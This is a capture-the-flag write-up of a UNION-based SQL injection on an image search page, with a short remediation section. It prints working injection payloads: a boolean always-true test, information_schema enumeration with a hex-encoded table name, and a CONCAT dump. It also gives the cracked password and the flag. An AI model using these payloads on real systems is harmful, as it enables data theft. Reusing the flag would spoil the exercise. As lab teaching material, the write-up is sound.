# Write up SQL Injection page searchimg

# Exploration

During our exploration of the web application, we came across a functionality to search for information about images based on their ID:

![Capture d'écran 2024-05-02 à 20.09.50.png](images/Capture_decran_2024-05-02_a_20.09.50.png)

# Exploitation

Given that this functionality allows us to retrieve images, we deduced that it had an interaction with the database and was potentially vulnerable to SQL injection. To confirm, we used the following
payload:

**1 OR 1=1**

This returned all the images:

![Capture d'écran 2024-05-02 à 20.11.16.png](images/Capture_decran_2024-05-02_a_20.11.16.png)

Unlike the other SQL injection present in the application, we did not receive any errors but were still dealing with a UNION-based injection. This also confirms that there are two columns being returned,
corresponding to **Title** and **URL**:

![Capture d'écran 2024-05-02 à 20.12.24.png](images/Capture_decran_2024-05-02_a_20.12.24.png)

The base SQL query likely looks like this:

```php
# 'images?' correspond to the table name that we need to discover
SELECT ?,? FROM images? WHERE id=<our_payload>;
```

Using this payload:

**1 UNION SELECT null,table_name FROM information_schema.tables**

We were able to recover the name of the table we were looking for:

![Capture d'écran 2024-05-02 à 20.16.08.png](images/Capture_decran_2024-05-02_a_20.16.08.png)



Next, we recovered the names of the columns using this payload:

**1 UNION SELECT null,column_name FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573**

We must encode **table_name** value in hexa, as it wasn't working with the literal value. We used this command:

```php
~ echo -n 'list_images' | xxd
00000000: 6c69 7374 5f69 6d61 6765 73              list_images
```

We got this:

![Capture d’écran 2024-05-02 à 20.37.17.png](images/Capture_decran_2024-05-02_a_20.37.17.png)


Then, by concataining the columns value, we were able to recover what we were looking for (Notice that for a strange reason, we were able to use the literal table name this time):

**1 UNION SELECT null,CONCAT(id,0x0a,url,0x0a,title,0x0a,comment) FROM list_images**

![Capture d’écran 2024-05-02 à 20.38.12.png](images/Capture_decran_2024-05-02_a_20.38.12.png)

Decoding the MD5 value, we obtained the word **albatroz**.

We then converted it to SHA256 for the flag:

```bash
~$ echo -n "albatroz" | openssl dgst -sha256
SHA2-256(stdin)= f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

# Remediation

SQL injections remain common vulnerabilities for web applications if we refer to the [OWASP Top 10](https://owasp.org/Top10/fr/). In 2021, injections (all types) ranked third:

![Capture d'écran 2024-05-02 à 20.04.09.png](images/Capture_decran_2024-05-02_a_20.04.09.png)

This can lead to severe consequences for vulnerable sites, including:

- Data manipulation or deletion
- Privilege escalation
- Information leakage
- Remote command execution

To protect yourself, follow these steps:

- Use an ORM that supports prepared queries
- Validate user input
- Never use user-controllable data in SQL queries
- Follow the principle of least privilege
- Encrypt sensitive data in the database
